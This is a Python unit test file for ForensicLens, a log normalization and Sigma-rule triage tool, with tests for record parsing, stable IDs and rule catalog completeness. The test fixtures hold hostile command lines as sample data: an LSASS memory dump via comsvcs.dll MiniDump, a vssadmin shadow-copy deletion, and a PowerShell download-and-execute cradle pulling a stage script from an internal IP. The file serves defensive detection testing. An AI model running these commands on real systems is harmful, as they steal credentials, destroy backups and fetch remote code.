"""Unit tests for ForensicLens log normalization, Sigma catalog, and API helpers."""

from __future__ import annotations

import base64
import json
from pathlib import Path

from src.ingest import _normalize_record, parse_jsonl_file
from src.sigma_triage import SIGMA_RULES


def test_normalize_record_extracts_forensic_fields() -> None:
    raw = {
        "timestamp": "2026-11-20T14:13:45Z",
        "channel": "Sysmon",
        "event_id": "10",
        "host": "FIN-WS-04",
        "user": "NT AUTHORITY\\SYSTEM",
        "process_name": "C:\\Windows\\System32\\rundll32.exe",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1410",
        "command_line": "rundll32.exe comsvcs.dll, MiniDump 684 lsass.dmp full",
    }
    doc = _normalize_record(raw, "incident.jsonl", 0)

    assert len(doc["_id"]) == 24
    assert doc["host"] == "FIN-WS-04"
    assert doc["event_id"] == "10"
    assert doc["target_image"].endswith("lsass.exe")
    assert doc["sigma_flagged"] is False


def test_deterministic_doc_id_is_stable() -> None:
    raw = {
        "timestamp": "2026-11-20T14:19:07Z",
        "event_id": "1",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "user": "SYSTEM",
    }
    first = _normalize_record(raw, "case.jsonl", 3)
    second = _normalize_record(raw, "case.jsonl", 3)
    assert first["_id"] == second["_id"]


def test_parse_jsonl_file(tmp_path: Path) -> None:
    sample = tmp_path / "sample.jsonl"
    sample.write_text(
        json.dumps({"event_id": "4624", "host": "DC-01", "logon_type": "10"}) + "\n",
        encoding="utf-8",
    )
    records = list(parse_jsonl_file(sample))
    assert len(records) == 1
    assert records[0]["logon_type"] == "10"


def test_sigma_rules_catalog_completeness() -> None:
    rule_ids = {r.rule_id for r in SIGMA_RULES}
    assert {
        "fl-sigma-001",
        "fl-sigma-002",
        "fl-sigma-003",
        "fl-sigma-004",
        "fl-sigma-005",
        "fl-sigma-006",
    }.issubset(rule_ids)
    for rule in SIGMA_RULES:
        assert rule.severity in {"critical", "high", "medium", "low"}
        assert "detection:" in rule.sigma_yaml
        assert isinstance(rule.dsl_query, dict)


def test_powershell_base64_decode_pattern() -> None:
    script = "IEX (New-Object Net.WebClient).DownloadString('http://10.42.8.19/stage.ps1')"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
    decoded = base64.b64decode(encoded).decode("utf-16-le")
    assert decoded == script
